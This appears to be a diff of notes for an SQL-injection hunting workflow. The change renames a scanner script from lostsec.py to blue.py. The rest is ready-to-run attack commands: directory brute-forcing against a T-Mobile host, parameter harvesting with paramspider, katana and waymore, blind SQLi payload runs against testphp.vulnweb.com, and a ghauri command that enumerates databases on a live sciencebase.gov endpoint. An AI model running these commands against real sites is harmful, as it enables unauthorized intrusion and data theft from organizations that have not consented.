@@ -13,7 +13,7 @@ developer name and personal email via installed.json file... commont
 dirsearch -u "https://digits.t-mobile.com/" -x 301,403,404,500,400,502,503,302,429 --random-agent --deep-recursive
 
 
-python3 lostsec.py -u "http://testphp.vulnweb.com/artists.php?artist=" -p payloads/xor.txt -t 5
+python3 blue.py -u "http://testphp.vulnweb.com/artists.php?artist=" -p payloads/xor.txt -t 5
 
   1. Methe
 
@@ -22,7 +22,7 @@ paramspider -d testphp.vulnweb.com -o urls.txt
 
 cat output/urls.txt | sed 's/FUZZ//g' >final.txt
 
-python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+python3 blue.py -l final.txt -p payloads/xor.txt -t 5
 
   2.Methe
 
@@ -32,7 +32,7 @@ cat urls.txt | grep -E ".php|.asp|.aspx|.cfm|.jsp" | grep '=' | sort > output.tx
 
 cat output.txt | sed 's/=.*/=/' >final.txt
 
-python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+python3 blue.py -l final.txt -p payloads/xor.txt -t 5
 
   3.Methe
 
@@ -42,14 +42,14 @@ katana -u http://testphp.vulnweb.com -d 5 | grep '=' | urldedupe | anew output.t
 
 cat output.txt | sed 's/=.*/=/' >final.txt
 
-python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+python3 blue.py -l final.txt -p payloads/xor.txt -t 5
 
 
   4. Math
 
 waymore -i "invasivespecies.gov" -mc 200,302 -mode U | qsreplace "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | sort -u | tee parameters.txt
 
-sudo python3 ./lostsec.py -l multichoice.com.parameters.txt -p payloads/xor.txt
+sudo python3 ./blue.py -l multichoice.com.parameters.txt -p payloads/xor.txt
 
 ghauri -u "https://www.sciencebase.gov/catalog/catalogParty/show?partyId=*" --batch --confirm --current-db --dbs
 
